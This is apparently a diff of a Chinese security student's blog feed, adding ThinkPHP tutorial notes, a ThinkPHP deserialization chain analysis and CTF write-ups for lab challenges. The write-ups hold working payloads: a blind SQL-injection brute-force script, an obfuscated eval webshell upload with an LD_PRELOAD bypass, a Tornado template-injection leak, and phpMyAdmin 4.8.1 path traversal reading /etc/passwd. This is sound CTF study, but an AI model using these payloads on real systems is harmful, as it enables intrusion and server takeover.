@@ -1278,7 +1278,7 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 
 
 <h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫后台发现index.php.swp备份</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;;</span><br><span class="line">		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;;</span><br><span class="line">		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>发现要求password的md5值的前6个字符为6d0bc1。敲代码（python）：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">for i in range(10000000):</span><br><span class="line">    if md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest()[:6] == &#x27;6d0bc1&#x27;:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
@@ -1363,6 +1363,190 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p>找到flag在&#x2F;tmp&#x2F;flagoefiu4r93</p>
 <p>故构造payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a  = new Test();</span><br><span class="line">$a-&gt;func = &quot;system&quot;;</span><br><span class="line">$a-&gt;p = &quot;cat /tmp/flagoefiu4r93&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>thinkphp开发 反序列化 composer</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>thinkphp</title>
+    <url>/2023/02/10/thinkphp/</url>
+    <content><![CDATA[<p>1.安装composer并设置环境变量</p>
+<p>先通过命令行配置composer：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure>
+
+<p>如果下载缓慢或上述地址产生障碍，可以使用国内阿里云镜像地址：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>
+
+<p>在cmd上安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5.1test</span><br></pre></td></tr></table></figure>
+
+<p>2.ThinkPHP的URL访问规则如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php/模块名/控制器名(类名)/操作名/参数/值...</span><br></pre></td></tr></table></figure>
+
+<p>3.模块设计</p>
+<p>ThinkPHP框架的默认访问模块是index，可以通过config目录下的app.php进行设置，</p>
+<p><img src="/2023/02/10/thinkphp/Users\86151\Desktop\20200323091742902.png" alt="20200323091742902"></p>
+<p>如果application目录下的模块目录只有一个，可以通过配置app.php的app_multi_molule选项设置成false</p>
+<p>也可以通过在index.php里的:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Container::get(&#x27;app&#x27;)-&gt;bind(&#x27;模块名&#x27;)-&gt;run()-&gt;send();</span><br></pre></td></tr></table></figure>
+
+<p>这种方式绑定单一的模块。</p>
+<p>空模块</p>
+<p>我们还可以通过配置app.php的其他选项来控制模块的行为属性，比如empty_module可以控制空模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;empty_module&#x27; =&gt; &#x27;404&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>一般可以设置一个404的页面，使空模块指向它。</p>
+<p>注意，空模块生效的前提是多模块开启和没有bind模块。</p>
+<p>另外，如果我只有一个模块index，则模块的目录可以去掉，然后配置app.php的app_multi_molule选项设置成false，只需要controller目录即可，而命名空间也就去掉了模块名：</p>
+<p>namespace app\controller;</p>
+<p>4.环境变量</p>
+<p>ThinkPHP提供了一个类库Env来获取环境变量，可以用来获取当前项目的各种目录，如应用目录、框架目录、路由目录等等</p>
+<p>获取方式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Env::get(<span class="string">&#x27;app_path&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>5.控制器定义，控制器操作</p>
+<p>基础控制器</p>
+<p>BaseController.php</p>
+<p>该基础控制器仅仅提供了控制器验证功能，并注入了think\App和think\Request对象，因此你可以直接在控制器中使用app和request属性调用think\App和think\Request对象实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use app\BaseController;</span><br><span class="line"></span><br><span class="line">class Index extends BaseController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $action = $this-&gt;request-&gt;action();</span><br><span class="line">        $path = $this-&gt;app-&gt;getBasePath();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>基础控制器提供了数据验证功能</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">use app\BaseController;</span><br><span class="line">use think\exception\ValidateException;</span><br><span class="line"></span><br><span class="line">class Index extends BaseController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $this-&gt;validate( [</span><br><span class="line">                &#x27;name&#x27;  =&gt; &#x27;thinkphp&#x27;,</span><br><span class="line">                &#x27;email&#x27; =&gt; &#x27;thinkphp@qq.com&#x27;,</span><br><span class="line">            ],  &#x27;app\index\validate\User&#x27;);</span><br><span class="line">        &#125; catch (ValidateException $e) &#123;</span><br><span class="line">            // 验证失败 输出错误信息</span><br><span class="line">            dump($e-&gt;getError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>渲染输出的三种方式</p>
+<p>1）return</p>
+<p>直接将结果return回去即可：</p>
+<p>return “这是结果”;<br>2）json输出（比如输出数组）</p>
+<p>举例如下：</p>
+<p>$data &#x3D; array(‘a’&#x3D;&gt;1,’b’&#x3D;&gt;2,’c’&#x3D;&gt;3);<br>return json($data);<br>3）模板输出</p>
+<p>前置操作</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$beforeActionList</span> = [</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>,</span><br><span class="line">    <span class="comment">//one方法执行不调用second前置</span></span><br><span class="line">    <span class="string">&#x27;second&#x27;</span> =&gt; [<span class="string">&#x27;except&#x27;</span> =&gt; <span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">    <span class="comment">//third前置只能通过调用one和two方法触发</span></span><br><span class="line">    <span class="string">&#x27;third&#x27;</span> =&gt; [<span class="string">&#x27;only&#x27;</span> =&gt; <span class="string">&#x27;one,two&#x27;</span>],</span><br><span class="line">];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">first</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;first&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">second</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;second&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">third</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;third&lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">one</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;one&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;two&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>重定向</p>
+<p>ThinkPHP的Controller类提供了两个跳转的方法，success(msg,url)和error(msg)，用于实现跳转重定向：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function index()</span><br><span class="line">  &#123;</span><br><span class="line">    if($this-&gt;flag)</span><br><span class="line">    &#123;</span><br><span class="line">      $this-&gt;success(&#x27;成功！&#x27;,&#x27;../&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      $this-&gt;error(&#x27;失败！&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面跳转的页面是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thinkphp/tpl/dispatch_jump.tpl</span><br></pre></td></tr></table></figure>
+
+<p>配置也在app.php中</p>
+<p>6.数据库增删改查</p>
+<p>查询数据<br>查询的常见方法有下面的这些：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Db::name();</span><br><span class="line">Db::table();</span><br><span class="line">find();</span><br><span class="line">findOrFail();</span><br><span class="line">findOrEmpty();</span><br><span class="line">select();</span><br><span class="line">selectOrFail();</span><br><span class="line">value(&#x27;username&#x27;);</span><br><span class="line">getLastSql();</span><br><span class="line">column(&#x27;username&#x27;,&#x27;id&#x27;);  //按id排序</span><br><span class="line">order(&#x27;id&#x27;,&#x27;desc&#x27;);       //将结果倒叙排序显示，一般接于where语句之后</span><br></pre></td></tr></table></figure>
+
+<p>注意：除了find和select方法是结果查询之外，其余方法查询结果均为数据库对象，它们可以一直使用链式查询操作，直到遇到find和select方法为止。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Db::table(&#x27;think_user&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;find();//查询</span><br><span class="line">$data = [&#x27;foo&#x27; =&gt; &#x27;bar&#x27;, &#x27;bar&#x27; =&gt; &#x27;foo&#x27;];</span><br><span class="line">Db::name(&#x27;user&#x27;)-&gt;insert($data);//增加数据</span><br><span class="line">Db::name(&#x27;user&#x27;)</span><br><span class="line">    -&gt;where(&#x27;id&#x27;, 1)</span><br><span class="line">    -&gt;update([&#x27;name&#x27; =&gt; &#x27;thinkphp&#x27;]);//更新数据</span><br><span class="line">Db::table(&#x27;think_user&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;delete();//删除数据    </span><br></pre></td></tr></table></figure>
+
+<p>查询表达式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(&#x27;字段名&#x27;,&#x27;查询表达式&#x27;,&#x27;查询条件&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>tp反序列化</title>
+    <url>/2023/02/17/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p>1.在index控制器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function fanxuliehua()</span><br><span class="line">    &#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">        unserialize($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟进save方法</span><br><span class="line"></span><br><span class="line">public function save(array $data = [], string $sequence = null): bool</span><br><span class="line">    &#123;</span><br><span class="line">        // 数据对象赋值</span><br><span class="line">        $this-&gt;setAttrs($data);</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#x27;BeforeWrite&#x27;)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</span><br><span class="line"></span><br><span class="line">        if (false === $result) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 写入回调</span><br><span class="line">        $this-&gt;trigger(&#x27;AfterWrite&#x27;);</span><br><span class="line"></span><br><span class="line">        // 重新记录原始数据</span><br><span class="line">        $this-&gt;origin   = $this-&gt;data;</span><br><span class="line">        $this-&gt;get      = [];</span><br><span class="line">        $this-&gt;lazySave = false;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进$this-&gt;updateDate()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function updateData(): bool</span><br><span class="line">    &#123;</span><br><span class="line">        // 事件回调</span><br><span class="line">        if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;checkData();</span><br><span class="line"></span><br><span class="line">        // 获取有更新的数据</span><br><span class="line">        $data = $this-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">        if (empty($data)) &#123;</span><br><span class="line">            // 关联更新</span><br><span class="line">            if (!empty($this-&gt;relationWrite)) &#123;</span><br><span class="line">                $this-&gt;autoRelationUpdate();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime) &#123;</span><br><span class="line">            // 自动写入更新时间</span><br><span class="line">            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp();</span><br><span class="line">            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 检查允许字段</span><br><span class="line">        $allowFields = $this-&gt;checkAllowFields();</span><br></pre></td></tr></table></figure>
+
+<p>代码会寻找更新的数据，$this-&gt;data不为空,然后$this-&gt;trigger(‘BeforeWrite’)的值需要为true</p>
+<p>看检查字段的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function db($scope = []): Query</span><br><span class="line">    &#123;</span><br><span class="line">        /** @var Query $query */</span><br><span class="line">        $query = self::$db-&gt;connect($this-&gt;connection)</span><br><span class="line">            -&gt;name($this-&gt;name . $this-&gt;suffix)</span><br><span class="line">            -&gt;pk($this-&gt;pk);</span><br></pre></td></tr></table></figure>
+
+<p>在checkAllowFields中有一个db方法</p>
+<p>字符串拼接符号<code>$this-&gt;name . $this-&gt;suffix</code> ，可以利用其触发<code>__toString</code></p>
+<p>__toString方法在Conversion类里</p>
+<p>最后发现可控的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$closure = $this-&gt;withAttr[$fieldName];</span><br><span class="line"> $value   = $closure($value, $this-&gt;data);</span><br></pre></td></tr></table></figure>
+
+<p>可以控制<code>$this-&gt;withAttr</code>，那么就等同于控制了<code>$closure</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>做题笔记FinalFeb</title>
+    <url>/2023/02/20/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0FinalFeb/</url>
+    <content><![CDATA[<h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>测试了一下，select，table等都被过滤</p>
+<p>扫描发现存在robots.txt，里面写了hint.txt，里面的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$black_list = “/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|’|=| |in|&lt;|&gt;|-|.|()|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i”;</span><br><span class="line"></span><br><span class="line">If $_POST[‘passwd’] === admin’s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>
+
+<p>发现过滤了很多东西，而且需要我们传正确的passwd才能得到flag。</p>
+<p>首先发现没有过滤反斜杠，因此可以转义单引号。但是过滤了<code># - &#39;</code>这三个东西，我们就没法将最后多出来的单引号给去掉。</p>
+<p>查资料发现了可以%00截断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&#x27;\&#x27;&amp;passwd=&#x27;||(1);%00&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果在输入框中直接输入%00，那么就会被编码成%2500，然后计算机在解码成%00，会黑名单过滤</p>
+<p>发现现当第一个字符为y的时候，会跳转到welcome.php，而且select，table等都被过滤，也没发现绕过的方法，所以写脚本进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line">url=&#x27;http://53a779e0-8dee-4239-a6f3-854a1756af10.node4.buuoj.cn:81/&#x27;</span><br><span class="line"></span><br><span class="line">strs = string.ascii_letters+string.digits+&quot;_&quot;</span><br><span class="line">result=&#x27;&#x27;</span><br><span class="line">payload=&quot;||(passwd/**/regexp**/0x&#123;&#125;);&quot;</span><br><span class="line">#payload=&quot;||(username/**/regexp/**/0x&#123;&#125;);&quot;</span><br><span class="line">while 1:</span><br><span class="line">    for j in strs:</span><br><span class="line">        p1=&quot;^&quot;+result+j</span><br><span class="line">        p2=bytes(p1,&#x27;UTF-8&#x27;)</span><br><span class="line">        pp=p2.hex()</span><br><span class="line">        ppp=payload.format(pp)</span><br><span class="line">        zero=unquote(&quot;%00&quot;, &#x27;utf-8&#x27;)</span><br><span class="line">        ppp+=zero</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;\\&quot;,</span><br><span class="line">            &quot;passwd&quot;:ppp</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data)</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        #print(r)</span><br><span class="line">        #break</span><br><span class="line">        if &quot;welcome&quot; in r:</span><br><span class="line">            result+=j</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">    #print(data)</span><br></pre></td></tr></table></figure>
+
+<p>得到密码</p>
+<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现eval()，应该是用system等函数来实现命令执行。<br>但是得要先绕过preg_match()中正则表达式的限制</p>
+<p>题目是要绕过preg_match()中正则表达式的限制并getshell，查资料考虑异或绕过，但是这个题可以使用urlencode绕过，异或比较麻烦</p>
+<p>异或的原理，先使用urlencode绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure>
+
+<p>构造一个phpinfo看一下PHP版本以及禁用函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<p>发现system被禁止了，但是可以使用assert()，先用urlencode绕过传一个webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+
+<p>命令是assert(eval($_POST[‘a’]));</p>
+<p>可以连接，需要执行readflag才能得到flag，但是无法执行</p>
+<p>查资料，，，利用linux提供的LD_preload环境变量，上传exp到&#x2F;tmp,在启动子进程的时候，新的子进程会加载上传的so文件，然后我们可以在so里面定义同名函数</p>
+<p>然后后面先包含bypass_disablefunc.php文件定义同名函数，运行readflag文件，输出的path在tmp文件中</p>
+<p>&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</p>
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目的提示</p>
+<p>flag in &#x2F;fllllllllllllag，打开&#x2F;welcome.txt，render()函数想到ssti</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>需要找到cookie_secret，观察网址，发现有filehash，修改filehash值，跳转到error页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现’cookie_secret’: ‘f3055f32-25bc-4292-8b24-a15db7e1dbe6’}</p>
+<p>读文件的格式都是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file?filename=/文件名&amp;filehash=</span><br></pre></td></tr></table></figure>
+
+<p>在hints.txt中filehash的提示</p>
+<p>md5(f3055f32-25bc-4292-8b24-a15db7e1dbe6+md5(fllllllllllllag))</p>
+<p>为filehash的值</p>
+<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>扫描到存在phpinfo(),phpmyadmin数据库管理页面，尝试访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/20/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0FinalFeb/Users\86151\myBlog\source_posts\做题笔记FinalFeb\1111.jpg" alt="1111"></p>
+<p>查询到<code>4.8.1</code>版本存在任意文件读取漏洞：</p>
+<p>在server_sql.php页面执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo()?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>php生成session时，会生成在&#x2F;tmp目录下，且以sess_开头，例如：&#x2F;tmp&#x2F;sess_be9f3bebfb7ab4192fd07c479cf6b171，其中记录着用户的操作:session文件的值也就对应了 HTTP 请求 Cookie 中phpMyAdmin的值。SQL语句被记录下来，在服务器解析该文件时，会被当作php代码执行。尝试包含session文件会使执行的SQL查询被当作了PHP代码执行。</p>
+<p>Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>可以成功执行，获取到了passwd文件的内容，尝试查找flag</p>
+<p><img src="/2023/02/20/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0FinalFeb/Users\86151\myBlog\source_posts\做题笔记FinalFeb\222.jpg" alt="222"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>源代码</p>
